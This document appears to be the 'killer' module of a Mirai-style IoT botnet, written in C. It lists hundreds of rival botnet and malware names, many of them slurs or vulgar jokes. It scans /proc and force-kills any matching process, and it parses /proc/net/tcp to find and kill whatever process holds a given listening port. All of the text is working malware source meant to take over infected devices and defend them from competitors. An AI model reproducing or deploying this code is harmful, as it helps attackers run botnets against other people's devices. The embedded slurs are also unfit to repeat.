#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/prctl.h>
#include <net/if.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

int i, fd, killerpid;
char pidPath[100];

char *KillStructure[] = {
    "902i13",
    "BzSxLxBxeY",
    "HOHO-LUGO7",
    "HOHO-U79OL",
    "JuYfouyf87",
    "NiGGeR69xd",
    "SO190Ij1X",
    "LOLKIKEEEDDE",
    "ekjheory98e",
    "scansh4",
    "MDMA",
    "fdevalvex",
    "scanspc",
    "MELTEDNINJAREALZ",
    "flexsonskids",
    "scanx86",
    "MISAKI-U79OL",
    "foAxi102kxe",
    "swodjwodjwoj",
    "MmKiy7f87l",
    "freecookiex86",
    "sysgpu",
    "frgege",
    "sysupdater",
    "0DnAzepd",
    "NiGGeRD0nks69",
    "frgreu",
    "0x766f6964",
    "NiGGeRd0nks1337",
    "gaft",
    "urasgbsigboa",
    "120i3UI49",
    "OaF3",
    "geae",
    "vaiolmao",
    "123123a",
    "Ofurain0n4H34D",
    "ggTrex",
    "ew",
    "wasads",
    "1293194hjXD",
    "OthLaLosn",
    "ggt",
    "wget-log",
    "1337SoraLOADER",
    "SAIAKINA",
    "ggtq",
    "1378bfp919GRB1Q2",
    "SAIAKUSO",
    "ggtr",
    "14Fa",
    "SEXSLAVE1337",
    "ggtt",
    "1902a3u912u3u4",
    "haetrghbr",
    "19ju3d",
    "SORAojkf120",
    "hehahejeje92",
    "2U2JDJA901F91",
    "SlaVLav12",
    "helpmedaddthhhhh",
    "2wgg9qphbq",
    "Slav3Th3seD3vices",
    "hzSmYZjYMQ",
    "5Gbf",
    "sora",
    "SoRAxD123LOL",
    "iaGv",
    "5aA3",
    "SoRAxD420LOL",
    "insomni",
    "640277",
    "SoraBeReppin1337",
    "ipcamCache",
    "66tlGg9Q",
    "jUYfouyf87",
    "6ke3",
    "TOKYO3",
    "lyEeaXul2dULCVxh",
    "93OfjHZ2z",
    "TY2gD6MZvKc7KU6r",
    "mMkiy6f87l",
    "A023UU4U24UIU",
    "TheWeeknd",
    "mioribitches",
    "A5p9",
    "TheWeeknds",
    "mnblkjpoi",
    "AbAd",
    "Tokyos",
    "neb",
    "Akiru",
    "U8inTz",
    "netstats",
    "Alex",
    "W9RCAKM20T",
    "newnetword",
    "Ayo215",
    "Word",
    "nloads",
    "BAdAsV",
    "Wordmane",
    "notyakuzaa",
    "Belch",
    "Wordnets",
    "obp",
    "BigN0gg0r420",
    "X0102I34f",
    "ofhasfhiafhoi",
    "BzSxLxBxeY",
    "X19I239124UIU",
    "oism",
    "Deported",
    "XSHJEHHEIIHWO",
    "olsVNwo12",
    "DeportedDeported",
    "XkTer0GbA1",
    "onry0v03",
    "FortniteDownLOLZ",
    "Y0urM0mGay",
    "pussyfartlmaojk",
    "GrAcEnIgGeRaNn",
    "YvdGkqndCO",
    "qGeoRBe6BE",
    "GuiltyCrown",
    "ZEuS69",
    "s4beBsEQhd",
    "HOHO-KSNDO",
    "ZEuz69",
    "sat1234",
    "HOHO-LUGO7",
    "aj93hJ23",
    "scanHA",
    "alie293z0k2L",
    "scanJoshoARM",
    "HellInSide",
    "ayyyGangShit",
    "scanJoshoARM5",
    "HighFry",
    "b1gl",
    "scanJoshoARM6",
    "IWhPyucDbJ",
    "boatnetz",
    "bigboats",
    "boatnet.",
    "scanJoshoARM7",
    "IuYgujeIqn",
    "btbatrtah",
    "scanJoshoM68K",
    "JJDUHEWBBBIB",
    "scanJoshoMIPS",
    "JSDGIEVIVAVIG",
    "cKbVkzGOPa",
    "scanJoshoMPSL",
    "JuYfouyf87",
    "ccAD",
    "scanJoshoPPC",
    "KAZEN-OIU97",
    "chickenxings",
    "scanJoshoSH4",
    "yakuskzm8",
    "KAZEN-PO78H",
    "cleaner",
    "scanJoshoSPC",
    "KAZEN-U79OL",
    "dbeef",
    "scanJoshoX86",
    "yakuz4c24",
    "KETASHI32",
    "ddrwelper",
    "scanarm5",
    "zPnr6HpQj2",
    "Kaishi-Iz90Y",
    "deexec",
    "scanarm6",
    "zdrtfxcgy",
    "Katrina32",
    "doCP3fVj",
    "scanarm7",
    "zxcfhuio",
    "Ksif91je39",
    "scanm68k",
    "Kuasa",
    "dvrhelper",
    "scanmips",
    "KuasaBinsMate",
    "eQnOhRk85r",
    "scanmpsl",
    "LOLHHHOHOHBUI",
    "eXK20CL12Z",
    "nya",
    "mezy",
    "QBotBladeSPOOKY",
    "hikariwashere",
    "0DnAzepd",
    "p4029x91xx",
    "32uhj4gbejh",
    "zhr",
    "a.out",
    "lzrd",
    "PownedSecurity69",
    "ggt",
    ".ares",
    "fxlyazsxhy",
    "jnsd9sdoila",
    "BzSxLxBxeY",
    "yourmomgaeis",
    "sdfjiougsioj",
    "Oasis", 
    "ggtr",
    "SEGRJIJHFVNHSNHEIHFOS",
    "apep999",
    "KOWAI-BAdAsV",
    "KOWAI-SAD",
    "jHKipU7Yl",
    "airdropmalware",
    "your_verry_fucking_gay",
    "Big-Bro-Bright",
    "sefaexec",
    "shirololi",
    "eagle.",
    "For-Gai-Mezy",
    "0x6axNL",
    "cloqkisvspooky",
    "myth",
    "SwergjmioG",
    "KILLEJW(IU(JIWERGFJGJWJRG",
    "Hetrh",
    "wewrthe",
    "IuFdKssCxz",
    "jSDFJIjio",
    "OnrYoXd666",
    "ewrtkjoketh",
    "ajbdf89wu823",
    "AAaasrdgs",
    "WsGA4@F6F",
    "GhostWuzHere666",
    "BOGOMIPS",
    "sfc6aJfIuY",
    "Demon.",
    "xeno-is-god",
    "ICY-P-0ODIJ",
    "gSHUIHIfh",
    "wrgL",
    "hu87VhvQPz",
    "dakuexecbin",
    "TacoBellGodYo",
    "loligang",
    "Execution",
    "orbitclient",
    "Amnesia",
    "Owari",
    "vcimanagement",
    "vcimanagement.",
    "UnHAnaAW",
    "z3hir",
    "obbo",
    "miori",
    "eagle",
    "doxx"
    "arm",
    "arm7",
    "x86",
    "mips",
    "mpsl",
    "sh4",
    ".arm",
    ".arm7",
    ".x86",
    ".mips",
    ".mpsl",
    ".sh4",
    "irc.",
    "irc",
    "mirai",
    "katana",
    "Alan",
    "Alan.",
    "596a96cc7bf9108cd896f33c44aedc8a",
    "db0fa4b8db0333367e9bda3ab68b8042.",
    "apep.",
    "pwnNet.",
    "uih7U8JY7Of7Y8O9d6t68IT67R8y76t7823tg8weuq",
    ".tsunami",
    "Hades."
    "mirai.",
    "Rollie",
    "lessie.",
    "sora",
    "hax.",
    "yakuza",
    "wordminer",
    "minerword",
    "SinixV4",
    "hoho",
    "g0dbu7tu",
    "orphic",   
    "furasshu",
    "horizon",
    "assailant",
    "Ares",
    "Kawaiihelper",
    "ECHOBOT",
    "DEMONS",
    "kalon",
    "Josho",
    "daddyscum",
    "akira.ak",
    "Hilix",
    "daku",
    "Tsunami",
    "estella",
    "Solar",
    "rift",
    "_-255.Net",
    "Cayosin",
    "Okami",
    "sysupdater",
    "OnrYoXd666",
    "Kosha",
    "bushido",
    "trojan",
    "shiina",
    "Reaper.",
    "Corona.",
    "wrgnuwrijo",
    "Aka",
    "irc",
    "irc.",
    "Hari",
    "orage",
    "fibre",
    "galil",
    "stresserpw",
    "stresser.pw",
    "Tohru",
    "Omni",
    "Josho",
    "kawaii",
    "Frosti",
    "sxj472sz",
    "HU6FIZTQU",
    "PFF1500RG",
    "plzjustfuckoff",
    "nvitpj",
    "elfLoad",
    "mioribitches",
    "Amakano",
    "tokupdater",
    "cum-n-go",
    "oblivion",
    "Voltage",
    "scanppc",
    "./"

};

char *killdirectories[] = {
    "/tmp/",
    "/root/",
    "/etc/",
    "/var/",
    "/dev/",
    "/mnt/",
    "/var/run/",
    "/var/tmp/",
    "/dev/netslink/",
    "/dev/shm/",
    "/bin/",
    "/boot/",
    "/usr/",
    "/",
};

void openandclose(char *value) {
    int file;

    file = open(value, O_RDONLY);

    read(file, pidPath, sizeof(pidPath));

    close(file);

}

void killerkillbyname(char *value) {
#ifdef DEBUG
    printf("[killer-kill-by-name] finding value: %s\n", value);
#endif
    struct dirent *file;
    DIR *dir;

    dir = opendir("/proc/");

    while(file = readdir(dir)) {
        char status_path[64], *ptr_status_path = status_path;

        int pid = atoi(file->d_name);

        table_unlock_val(TABLE_KILLER_PROC);
        table_unlock_val(TABLE_KILLER_MAPS);

        ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
        ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
        ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_MAPS, NULL));   

        table_lock_val(TABLE_KILLER_PROC);    
        table_lock_val(TABLE_KILLER_MAPS); 

        openandclose(file->d_name);

        if(strstr(status_path, "self"))
            continue;

        if(pid == killerpid)
            continue;

        if(strcasestr(pidPath, value)) {
#ifdef DEBUG
            printf("[killer-kill-by-name] found %s with value %s\n", file->d_name, value);
#endif
            kill(pid, 9);
        }
        memset(pidPath, 0, sizeof(pidPath));
    }
    closedir(dir);
}


void killerinit() {
#ifdef DEBUG
    printf("[killer] initialising\n");
#endif
    killerpid = getpid();

    //killerkillbyelf();

    for(i = 0; i < sizeof(KillStructure) / sizeof(KillStructure[0]); i++) {
        killerkillbyname(KillStructure[i]);
        usleep(100);
    }
}

void killer_kill(void)
{
    kill(killerpid, 9);
}


BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

#ifdef DEBUG
    printf("\e[94m[dbg] \e[95m[killer] Finding and killing processes holding port %d\n", ntohs(port));
#endif

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);
    table_unlock_val(TABLE_KILLER_TCP);

    fd = open(table_retrieve_val(TABLE_KILLER_TCP, NULL), O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;
        i += 2;

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);

    // If we failed to find it, lock everything and move on
    if (util_strlen(inode) == 0)
    {
#ifdef DEBUG
        printf("Failed to find inode for port %d\n", ntohs(port));
#endif
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);
        table_lock_val(TABLE_KILLER_TCP);

        return 0;
    }

#ifdef DEBUG
    printf("Found inode \"%s\" for port %d\n", inode, ntohs(port));
#endif

    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            // skip all folders that are not PIDs
            if (*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if (readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
#ifdef DEBUG
                        printf("\e[94m[dbg] \e[95m[killer] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
                        kill(util_atoi(pid, 10), 9);
#else
                        kill(util_atoi(pid, 10), 9);
#endif
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);

    return ret;
}
